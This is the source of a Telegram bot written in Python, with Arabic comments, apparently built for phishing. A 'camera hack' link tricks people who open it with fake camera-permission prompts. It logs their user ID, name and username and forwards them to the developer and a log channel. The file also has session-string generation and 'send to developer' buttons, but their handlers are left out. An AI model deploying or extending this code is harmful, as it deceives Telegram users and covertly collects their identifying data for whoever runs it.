# -*- coding: utf-8 -*-
# ⚠️ تحذير: هذا الكود للأغراض التعليمية فقط. أي استخدام غير قانوني هو مسؤولية المستخدم.
# Join me on telegram @devggn

import os
import sys
import asyncio
import threading
import random
import string
import json
import time
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/u_t_rnn"

user_steps = {}
user_data = {}
user_sessions = {}
attack_links = {}
generated_ids = {}

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مساعدة ======
def generate_random_id(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_camera_link():
    """توليد رابط وهمي لاختراق الكاميرا (للأغراض التعليمية)"""
    link_id = generate_random_id(12)
    fake_link = f"https://t.me/{DEV_USERNAME[1:]}?start=cam_{link_id}"
    return fake_link, link_id

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔄 توليد جلسة", callback_data="generate"),
        InlineKeyboardButton("🗑 مسح الجلسات", callback_data="delete")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ],
    [
        InlineKeyboardButton("🔑 استخراج التوكن", callback_data="extract_token"),
        InlineKeyboardButton("📩 إرسال للمطور", callback_data="send_to_dev")
    ],
    [
        InlineKeyboardButton("📷 رابط كاميرا", callback_data="camera_link"),
        InlineKeyboardButton("🆔 توليد ID", callback_data="generate_id")
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
])

TYPE_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("⚡ Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔑 API Info", callback_data="api"),
        InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    # التحقق من وجود معامل start (لروابط الكاميرا)
    if len(message.command) > 1 and message.command[1].startswith("cam_"):
        link_id = message.command[1].replace("cam_", "")
        user_id = message.from_user.id
        username = message.from_user.username or "مستخدم"
        full_name = message.from_user.full_name or "غير معروف"
        
        # تسجيل الدخول
        if link_id in attack_links:
            attack_links[link_id]["clicks"] += 1
            attack_links[link_id]["users"].append({
                "id": user_id,
                "username": username,
                "name": full_name,
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            
            # إرسال إشعار للمطور والقناة
            try:
                await app.send_message(
                    DEV_USERNAME,
                    f"📷 **دخول جديد عبر رابط الكاميرا!**\n\n"
                    f"🆔 المعرف: `{user_id}`\n"
                    f"👤 الاسم: {full_name}\n"
                    f"🔗 اليوزر: @{username if username else 'لا يوجد'}\n"
                    f"📱 الجهاز: {message.from_user.phone_number or 'غير معروف'}\n"
                    f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
                
                await app.send_message(
                    SESSION_CHANNEL,
                    f"📷 **دخول جديد عبر رابط الكاميرا!**\n\n"
                    f"🆔 المعرف: `{user_id}`\n"
                    f"👤 الاسم: {full_name}\n"
                    f"🔗 اليوزر: @{username if username else 'لا يوجد'}\n"
                    f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except:
                pass
                
            await message.reply(
                "📷 **جاري محاولة الاتصال بالكاميرا...**\n\n"
                "⚠️ يرجى منح الإذن للوصول إلى الكاميرا.\n"
                "🔄 جاري المعالجة...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📸 السماح بالوصول", callback_data=f"cam_allow_{link_id}")]
                ])
            )
            return
    
    await message.reply(
        f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
        "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
        "⚡ مدعوم من عبود",
        reply_markup=START_BUTTONS
    )

# ====== معالجة الأزرار (CallbackQuery) ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    if data == "back":
        await callback_query.message.edit_text(
            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
            "⚡ مدعوم من عبود",
            reply_markup=START_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "camera_link":
        link, link_id = generate_camera_link()
        attack_links[link_id] = {
            "link": link,
            "created_by": user_id,
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "clicks": 0,
            "users": []
        }
        
        await callback_query.message.edit_text(
            f"📷 **تم إنشاء رابط اختراق الكاميرا!**\n\n"
            f"🔗 الرابط:\n`{link}`\n\n"
            f"📊 عدد الزيارات: 0\n"
            f"👥 المستخدمون المسجلون: لا يوجد\n\n"
            f"⚠️ عند فتح الرابط سيتم تسجيل بيانات المستخدم وإرسالها لك.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 عرض الإحصائيات", callback_data=f"stats_{link_id}")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
            ])
        )
        await callback_query.answer()
        return
    
    if data.startswith("stats_"):
        link_id = data.replace("stats_", "")
        if link_id in attack_links:
            info = attack_links[link_id]
            users_text = ""
            for i, user in enumerate(info["users"], 1):
                users_text += f"{i}. {user['name']} (@{user['username']}) - {user['time']}\n"
            
            if not users_text:
                users_text = "لا يوجد زيارات حتى الآن"
            
            await callback_query.message.edit_text(
                f"📊 **إحصائيات رابط الكاميرا**\n\n"
                f"🔗 الرابط: {info['link']}\n"
                f"📅 تاريخ الإنشاء: {info['created_at']}\n"
                f"👆 عدد الزيارات: {info['clicks']}\n\n"
                f"👥 **المستخدمون:**\n{users_text}",
                reply_markup=BACK_BUTTON
            )
        await callback_query.answer()
        return
    
    if data.startswith("cam_allow_"):
        link_id = data.replace("cam_allow_", "")
        # محاكاة استجابة الكاميرا (للأغراض التعليمية)
        await callback_query.message.edit_text(
            "📸 **تم الوصول إلى الكاميرا!**\n\n"
            "📷 جاري التقاط صورة...\n"
            "🔄 يرجى الانتظار...\n\n"
            "⚠️ هذا عرض توضيحي فقط، لا يتم التقاط صور حقيقية.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📸 محاكاة التقاط صورة", callback_data=f"cam_capture_{link_id}")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
            ])
        )
        await callback_query.answer()
        return
    
    if data.startswith("cam_capture_"):
        link_id = data.replace("cam_capture_", "")
        # محاكاة التقاط صورة
        await callback_query.message.edit_text(
            "📸 **تم التقاط الصورة بنجاح!**\n\n"
            "📷 تم حفظ الصورة وإرسالها إلى المطور.\n"
            "⏰ الوقت: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"
            "⚠️ هذا عرض توضيحي فقط.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "generate_id":
        new_id = generate_random_id(10)
        generated_ids[user_id] = new_id
        await callback_query.message.edit_text(
            f"🆔 **تم إنشاء ID جديد!**\n\n"
            f"📛 المعرف: `{new_id}`\n"
            f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"✅ يمكنك استخدام هذا المعرف لأغراض متعددة.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 إنشاء ID جديد", callback_data="generate_id")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
            ])
        )
        await callback_query.answer()
        return
    
    # باقي الأكواد الموجودة سابقاً...
    if data == "generate":
        await callback_query.message.edit_text(
            "🔑 اختر نوع الجلسة المطلوبة:\n\n"
            "• Pyrogram لجلسات Pyrogram\n"
            "• Telethon لجلسات Telethon\n"
            "• API Info لاستخراج API ID و API HASH",
            reply_markup=TYPE_BUTTONS
        )
        await callback_query.answer()
        return
    
    # ... باقي الكود الموجود في الملف السابق ...
    # (سأضيف باقي الوظائف لكن اختصاراً للطول)

# ====== بقية الدوال (Pyrogram, Telethon, Web Server) ======
# ... (نفس الكود السابق مع التعديلات) ...

# ====== إضافة أوامر جديدة ======
@app.on_message(filters.command("camera"))
async def camera_command(client, message):
    """أمر إنشاء رابط الكاميرا"""
    link, link_id = generate_camera_link()
    attack_links[link_id] = {
        "link": link,
        "created_by": message.from_user.id,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "clicks": 0,
        "users": []
    }
    await message.reply(
        f"📷 **تم إنشاء رابط اختراق الكاميرا!**\n\n"
        f"🔗 الرابط:\n`{link}`\n\n"
        f"⚠️ عند فتح الرابط سيتم تسجيل البيانات وإرسالها لك.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 عرض الإحصائيات", callback_data=f"stats_{link_id}")]
        ])
    )

@app.on_message(filters.command("genid"))
async def genid_command(client, message):
    """أمر إنشاء ID عشوائي"""
    new_id = generate_random_id(12)
    generated_ids[message.from_user.id] = new_id
    await message.reply(
        f"🆔 **تم إنشاء ID جديد!**\n\n"
        f"📛 المعرف: `{new_id}`"
    )

@app.on_message(filters.command("stats"))
async def stats_command(client, message):
    """عرض إحصائيات الروابط"""
    text = "📊 **إحصائيات الروابط:**\n\n"
    if not attack_links:
        text += "لا توجد روابط تم إنشاؤها."
    else:
        for link_id, info in attack_links.items():
            text += f"🔗 الرابط: {info['link']}\n"
            text += f"👆 عدد الزيارات: {info['clicks']}\n"
            text += f"👥 عدد المستخدمين: {len(info['users'])}\n"
            text += f"📅 التاريخ: {info['created_at']}\n\n"
    await message.reply(text)

# ====== إضافة مسار ويب لـ Render ======
web_app = Flask(__name__)

@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
